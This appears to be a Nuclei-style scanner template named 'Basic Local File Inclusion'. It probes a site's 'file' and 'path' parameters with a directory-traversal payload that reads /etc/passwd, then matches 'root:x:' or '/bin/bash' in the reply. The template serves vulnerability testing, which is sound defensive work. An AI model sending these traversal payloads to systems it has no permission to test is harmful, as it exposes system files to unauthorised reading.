http:
- matchers:
  - condition: or
    type: word
    words:
    - 'root:x:'
    - /bin/bash
  method: GET
  path:
  - '{{BaseURL}}/?file=../../../../../../etc/passwd'
  - '{{BaseURL}}/?path=../../../../../../etc/passwd'
  stop-at-first-match: true
id: ai-lfi-basic
info:
  author: reewardius
  name: Basic Local File Inclusion
  severity: critical
  tags: lfi,web
